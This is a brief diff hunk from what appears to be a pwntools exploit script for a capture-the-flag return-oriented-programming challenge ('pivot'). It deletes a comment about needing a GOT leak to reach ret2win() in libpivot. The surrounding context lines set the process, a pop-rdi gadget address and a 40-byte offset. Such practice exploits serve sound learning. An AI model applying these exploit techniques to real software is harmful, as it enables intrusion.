@@ -137,8 +137,6 @@ context.log_level = 'critical'
 
 p = elf.process()
 
-# Understand we need a GOT leak since we have to call ret2win() from the libpivot library which has PIE enabled 
-
 pop_rdi = 0x0000000000400a33
 
 offset = 40
